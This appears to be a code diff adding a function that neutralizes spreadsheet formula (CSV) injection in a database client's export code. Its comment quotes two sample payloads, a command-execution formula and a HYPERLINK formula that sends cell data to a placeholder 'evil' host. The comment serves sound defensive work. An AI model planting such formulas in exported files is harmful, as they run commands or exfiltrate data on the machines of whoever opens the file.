@@ -35,6 +35,26 @@ export function cellExport(v: unknown): string {
 }
 
 /**
+ * A cell value made safe against spreadsheet formula injection (CSV injection).
+ *
+ * Excel, Google Sheets and LibreOffice treat a cell whose first character is
+ * `= + - @` (or a leading TAB / CR) as a *formula*, not text. A database row
+ * value like `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/?"&A1,"x")` then
+ * executes or exfiltrates when the exported file is opened — and RFC-4180
+ * quoting does not help, because `="..."` still parses as a formula. Row data
+ * in a DB client is frequently attacker-influenced, so this is a real path
+ * (security review FILE-01).
+ *
+ * The fix is OWASP's: prefix the offending cell with a single quote, which
+ * spreadsheets treat as "the rest is literal text." This mutates the exported
+ * value, so it is opt-out via the "raw" export mode.
+ */
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+export function neutralizeFormula(value: string): string {
+  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
+}
+
+/**
  * A value made safe to sit inside one Markdown table cell.
  *
  * Order matters and each step exists for a reason:
